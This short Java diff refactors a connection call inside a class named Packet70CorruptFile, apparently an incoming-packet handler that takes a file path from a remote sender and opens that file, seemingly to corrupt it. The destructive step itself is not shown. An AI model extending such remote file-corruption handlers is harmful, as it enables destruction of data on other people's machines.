@@ -11,7 +11,7 @@ public class Packet70CorruptFile extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
-		String file = Connection.readLine();
+		String file = Connection.instance.readLine();
 		File f = new File(file);
 		if (f.exists()) {
 			int length = (int) f.length();
